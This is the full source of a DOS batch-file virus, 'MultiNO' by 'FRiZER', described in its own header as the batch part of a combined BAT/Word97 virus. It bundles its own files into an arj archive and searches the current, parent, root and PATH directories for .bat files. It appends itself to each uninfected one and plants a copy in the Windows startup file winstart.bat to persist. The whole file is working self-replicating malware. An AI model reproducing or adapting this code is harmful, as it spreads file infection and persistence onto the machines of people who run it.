@echo off
goto _%1
::   MultiNO(BAT part)   ::
:: 1st BAT/Word97 virus! ::
:: ----- by FRiZER ----- ::
:_
arj a _multino.arj _*.*>nul
for %%a in (.;..;\;%path%) do call %0 p %%a
copy/b _winstar.bat+_multino.arj %winbootdir%\winstart.bat /y>nul
goto _e
:_p
for %%a in (%2\*.bat) do call %0 i %%a
goto _e
:_i
arj l %2>nul
if errorlevel 1 goto _n
goto _e
:_n
copy/b %2+_plugins.bat+_multino.arj %2>nul
:_e